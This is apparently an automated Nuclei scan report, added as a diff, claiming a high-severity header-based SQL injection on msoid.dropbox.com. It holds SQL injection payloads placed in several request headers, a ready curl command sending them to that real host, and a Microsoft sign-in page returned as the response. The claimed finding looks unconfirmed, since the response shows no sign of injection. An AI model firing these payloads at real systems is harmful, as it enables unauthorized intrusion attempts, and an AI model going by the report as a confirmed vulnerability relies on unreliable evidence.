@@ -1,0 +1,119 @@
+### Request header based sqli (header-sqli) found on https://msoid.dropbox.com
+
+----
+**Details**: **header-sqli** matched at https://msoid.dropbox.com
+
+**Protocol**: HTTP
+
+**Full URL**: https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638377295744412296.MzJjYmU1ZDMtOTlkNS00NTBjLTljNTctNGFiYmU5MTlkN2VhNjU0YTQwODAtN2JmMy00YzY2LTk3MzgtOTEwNmYxY2ZlZDI3&ui_locales=en&mkt=en&client-request-id=0dc56593-7c7e-478a-9fd6-66e832b52857&state=PJTb-ikbohwP3nXti8tKh550k-R4xVOHjLSZkAha29ADbO7tTUbS2sUtSnAwV9OI-Aqkr55QJJ6M7q7EL7XyfwHmQTQBYLYmh3lqzyAeZkrIFZycwIj4cMpZhOiJpOCZZHcL94dI61NYiDbbKyjdJvoOJXoAPvlOat1qCaLEIHQHRD3sEXQmlzhXuhaoRFbYaI3_J7aL3AeDIv5U0NUGJkkpsUay816MbS0F-ICWctSRSn2NCUVfmLmG31rUl5OteTmU7Dm38oJfPfeFb4-Wpg&x-client-SKU=ID_NET6_0&x-client-ver=6.34.0.0
+
+**Timestamp**: Sat Dec 9 14:39:36 +0000 UTC 2023
+
+**Template Information**
+
+| Key | Value |
+| --- | --- |
+| Name | Request header based sqli |
+| Authors | panch0r3d (thanks https://github.com/mr-pentestguy for all of the regexes) |
+| Tags |  |
+| Severity | high |
+
+**Request**
+```http
+GET / HTTP/1.1
+Host: msoid.dropbox.com
+User-Agent: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '%1'
+Connection: close
+Accept: */*
+Accept-Language: en
+Cookie: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '%1'
+Referer: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '%1'
+X-Forwarded-For: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '%1'
+Accept-Encoding: gzip
+
+
+```
+
+**Response**
+```http
+HTTP/1.1 200 OK
+Connection: close
+Cache-Control: no-store, no-cache
+Content-Type: text/html; charset=utf-8
+Date: Sat, 09 Dec 2023 14:39:34 GMT
+Expires: -1
+Link: <https://aadcdn.msftauth.net>; rel=preconnect; crossorigin
+Link: <https://aadcdn.msftauth.net>; rel=dns-prefetch
+Link: <https://aadcdn.msauth.net>; rel=dns-prefetch
+P3p: CP="DSP CUR OTPi IND OTRi ONL FIN"
+Pragma: no-cache
+Set-Cookie: buid=0.AVcAMe_N-B6jSkuT5F9XHpElWltEZUfGMrBJg-Ydk3ZSdsoBAAA.AQABAAEAAAAmoFfGtYxvRrNriQdPKIZ-y56a9rUa_iisZfK-xVtfE8z5wpJxQ8vzDeASmscBrALJF7rVN2jMTU2ZMM1uauL4pCvNh-rPAYXyqdIN0Rr0wIyjlD3XCseU_AAE5OOA07QgAA; expires=Mon, 08-Jan-2024 14:39:35 GMT; path=/; secure; HttpOnly; SameSite=None
+Set-Cookie: esctx=PAQABAAEAAAAmoFfGtYxvRrNriQdPKIZ-Mu1Dezm7PtlZLSkO7sD_7f9OeUi3Ai3JAGRsidDwEpxr1CJdUYPVy0wMCYIYEDcC0B28LmLyT9_z5tnALORa_dpByhdqnXsgtqU1aVRrMwNcAsaPICzMCw3Fy-g93WuB0VLsWkJ2kX8O5zHNhZYr3Hv0Ihze9XKkRMemJAr_O0ggAA; domain=.login.microsoftonline.com; path=/; secure; HttpOnly; SameSite=None
+Set-Cookie: esctx-sutDm0u0Ljk=AQABAAEAAAAmoFfGtYxvRrNriQdPKIZ-WiX0nHV3q4I-wcNE6fYTpKPsqo36RMvBb85LZCIivmcVRmP31vf-TOetSyYNu6X0iaGTD8Emv4Sr_xEN1NlvPOP1Vc5jGniQGja76lc7mcwfLaKD22u07WEs2wFVEV8dbVzJvTlkoNu-uUbyJrZlvSAA; domain=.login.microsoftonline.com; path=/; secure; HttpOnly; SameSite=None
+Set-Cookie: fpc=Auq8gp9v7EBFv4VJCt9Mc6q8Ae7AAQAAACdzBt0OAAAA; expires=Mon, 08-Jan-2024 14:39:35 GMT; path=/; secure; HttpOnly; SameSite=None
+Set-Cookie: x-ms-gateway-slice=estsfd; path=/; secure; samesite=none; httponly
+Set-Cookie: stsservicecookie=estsfd; path=/; secure; samesite=none; httponly
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Vary: Accept-Encoding
+X-Content-Type-Options: nosniff
+X-Dns-Prefetch-Control: on
+X-Frame-Options: DENY
+X-Ms-Clitelem: 1,0,0,,
+X-Ms-Ests-Server: 2.1.16919.4 - WUS3 ProdSlices
+X-Ms-Request-Id: 924ec60b-9b38-4ae3-814f-9bc5cf064800
+X-Xss-Protection: 0
+
+
+
+<!-- Copyright (C) Microsoft Corporation. All rights reserved. -->
+<!DOCTYPE html>
+<html dir="ltr" class="" lang="en">
+<head>
+    <title>Sign in to your account</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="-1">
+    <link rel="preconnect" href="https://aadcdn.msftauth.net" crossorigin>
+<meta http-equiv="x-dns-prefetch-control" content="on">
+<link rel="dns-prefetch" href="//aadcdn.msftauth.net">
+<link rel="dns-prefetch" href="//aadcdn.msauth.net">
+
+    <meta name="PageID" content="ConvergedSignIn" />
+    <meta name="SiteID" content="" />
+    <meta name="ReqLC" content="9" />
+    <meta name="LocLC" content="en" />
+
+        <meta name="referrer" content="origin" />
+
+        <meta name="format-detection" content="telephone=no" />
+
+    <noscript>
+        <meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/jsdisabled" />
+    </noscript>
+
+    
+    
+<meta name="robots" content="none" />
+
+<script type="text/javascript">//<![CDATA[
+$Config={"fShowPersistentCookiesWarning":false,"urlMsaSignUp":"https://login.live.com/oauth20_authorize.srf?client_id=4765445b-32c6-49b0-83e6-1d93765276ca\u0026scope=openid+profile+https%3a%2f%2fwww.office.com%2fv2%2fOfficeHome.All\u0026redirect_uri=https%3a%2f%2fwww.office.com%2flandingv2\u0026response_type=code+id_token\u0026state=PJTb-ikbohwP3nXti8tKh550k-R4xVOHjLSZkAha29ADbO7tTUbS2sUtSnAwV9OI-Aqkr55QJJ6M7q7EL7XyfwHmQTQBYLYmh3lqzyAeZkrIFZycwIj4cMpZhOiJpOCZZHcL94dI61NYiDbbKyjdJvoOJXoAPvlOat1qCaLEIHQHRD3sEXQmlzhXuhaoRFbYaI3_J7aL3AeDIv5U0NUGJkkpsUay816MbS0F-ICWctSRSn2NCUVfmLmG31rUl5OteTmU7Dm38oJfPfeFb4-Wpg\u0026response_mode=form_post\u0026nonce=638377295744412296.MzJjYmU1ZDMtOTlkNS00NTBjLTljNTctNGFiYmU5MTlkN2VhNjU0YTQwODAtN2JmMy00YzY2LTk3MzgtOTEwNmYxY2ZlZDI3\u0026x-client-SKU=ID_NET6_0\u0026x-client-Ver=6.34.0.0\u0026uaid=0dc565937c7e478a9fd666e832b52857\u0026msproxy=1\u0026issuer=mso\u0026tenant=common\u0026ui_locales=en\u0026signup=1\u0026lw=1\u0026fl=easi2\u0026epct=PAQABAAEAAAAmoFfGtYxvRrNriQdPKIZ-rWkgRKZNMCfw8EwMUrtUaBnB0XbPspH2A7qm3qYAEqqbHo3ZxUziPzy9P_PoMuGXeI1G0m9nf_o__4uAis558PGc6_8U1paI9BmsjBOzouLGBzV4y0JSw9Mkxi759j_p5ENOvz-MdliOU0LJavxyVebf7YelIqsuGQmcxEb_2MCWChIZpw0SXwezfe-_2z-L_mKoqoKnor9hWVXZSoZLviAA\u0026jshs=0","urlMsaLogout":"https://login.live.com/logout.srf?iframed_by=https%3a%2f%2flogin.microsoftonline.com","urlOtherIdpForget":"https://login.live.com/forgetme.srf?iframed_by=https%3a%2f%2flogin.microsoftonline.com","showCantAccessAccountLink":true,"urlGitHubFed":"https://login.live.com/oauth20_authorize.srf?client_id=4765445b-32c6-49b0-83e6-1d93765276ca\u0026scope=openid+profile+https%3a%2f%2fwww.office.com%2fv2%2fOfficeHome.All\u0026redirect_uri=https%3a%2f%2fwww.office.com%2flandingv2\u0026response_type=code+id_token\u0026state=PJTb-ikbohwP3nXti8tKh550k-R4xVOHjLSZkAha29ADbO7tTUbS2sUtSnAwV9OI-Aqkr55QJJ6M7q7EL7XyfwHmQTQBYLYmh3lqzyAeZkrIFZycwIj4cMpZhOiJpOCZZHcL94dI61NYiD.... Truncated ....
+```
+
+**Extra Information**
+
+**Extracted results:**
+
+- Warning":false,"urlMsaSignUp":"https://login.live.com/oauth20_authorize.srf?client_id=4765445b-32c6-49b0-83e6-1d93765276ca\u0026scope=openid+profile+https%3a%2f%2fwww.office.com%2fv2%2fOfficeHome.All\u0026redirect_uri=https%3a%2f%2fwww.office.com%2flandingv2\u0026response_type=code+id_token\u0026state=PJTb-ikbohwP3nXti8tKh550k-R4xVOHjLSZkAha29ADbO7tTUbS2sUtSnAwV9OI-Aqkr55QJJ6M7q7EL7XyfwHmQTQBYLYmh3lqzyAeZkrIFZycwIj4cMpZhOiJpOCZZHcL94dI61NYiDbbKyjdJvoOJXoAPvlOat1qCaLEIHQHRD3sEXQmlzhXuhaoRFbYaI3_J7aL3AeDIv5U0NUGJkkpsUay816MbS0F-ICWctSRSn2NCUVfmLmG31rUl5OteTmU7Dm38oJfPfeFb4-Wpg
+
+
+
+**CURL command**
+```sh
+curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '\''%1'\''' -H 'Referer: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '\''%1'\''' -H 'User-Agent: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '\''%1'\''' -H 'X-Forwarded-For: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '\''%1'\''' 'https://msoid.dropbox.com/'
+```
+
+----
+
+Generated by [Nuclei v3.1.0-dev](https://github.com/projectdiscovery/nuclei)
